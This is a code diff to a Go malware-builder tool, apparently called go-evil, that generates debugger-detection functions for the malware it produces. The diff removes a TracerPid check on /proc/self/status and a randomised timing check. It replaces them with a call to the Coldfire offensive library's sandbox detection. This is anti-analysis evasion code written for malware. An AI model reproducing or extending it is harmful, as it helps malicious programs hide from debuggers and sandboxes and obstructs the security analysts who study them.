@@ -12,83 +12,11 @@ import (
 //
 func identify_debugger(s_json string) string {
 	data_object := structure.Receive(s_json)
-	body := []string{"func detect_debugger() bool {", "toReturn := false"}
+	body := []string{"func detect_debugger() bool {", "return coldfire.SandboxAll()", "}"}
 
-	if data_object.Target_os == "windows" {
-		// Need to figure this section out, but this section will be disabled until further
-		// body = append(body,
-		// 	"driver := windows.NewLazyDLL(\"kernel32.dll\")",
-		// 	"IsDebuggerPresent := driver.NewProc(\"IsDebuggerPresent\")",
-		// 	"a,b,c := IsDebuggerPresent.Call()",
-		// 	"fmt.Println(a,b,c)")
-
-		// data_object.Add_go_import("golang.org/x/sys/windows")
-		// data_object.Add_go_import("fmt")
-
-	} else {
-		body = append(body,
-			"file, err := os.Open(\"/proc/self/status\")",
-			"if err == nil {",
-			"defer file.Close()",
-
-			"for {",
-			"var tpid int",
-			"num, err := fmt.Fscanf(file, \"TracerPid: %d\\n\", &tpid)",
-			"if err == io.EOF {",
-			"break",
-			"}",
-
-			"if num != 0{",
-			"if tpid != 0{",
-			"toReturn = true",
-			"}",
-			"break",
-			"}",
-
-			"}}")
-
-		data_object.Add_go_import("io")
-		data_object.Add_go_import("fmt")
-
-	}
-
-	body = append(body, "return toReturn", "}")
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 	data_object.Add_go_function(body)
 
-	return structure.Send(data_object)
-}
-
-//
-//
-// Adds the responsible code used for detecting if the malware is launched
-// under a debugger by utilizing the time difference betwen two points
-// This might mean that we get a false positive on slower computers.
-// We use a random time to make it harder to get a pattern for the debuggers.
-//
-//
-func identify_debugger_with_time(s_json string) string {
-	data_object := structure.Receive(s_json)
-
-	data_object.Add_go_function([]string{
-		"func detect_debugger_time() bool {",
-		"toReturn := false",
-		"old := time.Now()",
-		"a := 1",
-		"b := 1",
-		"for i := 0; i < 100; i++ {",
-		"a = ((2 * i) % 2) + i + 20",
-		"b = a % (b * 3)",
-		"}",
-		"new := time.Now()",
-		"diff := new.Sub(old)",
-		"if diff.Seconds() > float64(tools.Generate_random_int()) {",
-		"toReturn = true",
-		"}",
-		"return toReturn",
-		"}"})
-
-	data_object.Add_go_import("time")
-	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	return structure.Send(data_object)
 }
 
@@ -167,7 +95,6 @@ func generate_behavior_debugging(s_json string) string {
 
 	if data_object.Debugger_behavior != "none" {
 		s_json = identify_debugger(s_json) // Adds neccessary code to identify a debugger
-		s_json = identify_debugger_with_time(s_json)
 
 		switch data_object.Debugger_behavior {
 		case "stop":
